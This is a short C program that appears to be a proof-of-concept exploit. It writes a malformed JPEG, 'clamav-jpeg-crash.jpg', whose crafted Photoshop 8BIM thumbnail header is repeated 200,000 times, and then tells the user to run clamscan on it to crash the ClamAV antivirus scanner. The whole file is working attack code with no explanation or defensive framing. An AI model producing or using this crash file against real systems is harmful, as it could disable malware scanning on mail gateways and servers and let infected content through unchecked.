const char crashstr[] = "\xff\xd8" // jpg marker 
                        "\xff\xed" // exif data 
                        "\x00\x02" // length 
                        "Photoshop 3.0\x00"
                        "8BIM"
                        "\x04\x0c" // thumbnail id  
                        "\x00" 
                        "\x01"
                        "\x01\x01\x01\x01"
                        "0123456789012345678912345678"; // skip over 28 bytes 

#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>

#define NR_ITER 200000

int main() {
        FILE *fp;
        int i;
        fp = fopen("clamav-jpeg-crash.jpg", "w+");
        if (!fp) {
                printf("can't open/create file\n");
                exit(0);
        }
        for (i = 0; i < NR_ITER; i++) {
                fwrite(crashstr, sizeof(crashstr)-1/*don't want 0-byte ?*/, 1,
fp);
        }
        fclose(fp);
        printf("done, now run clamscan on ./clamav-jpeg-crash.jpg\n");
        exit(0);
}
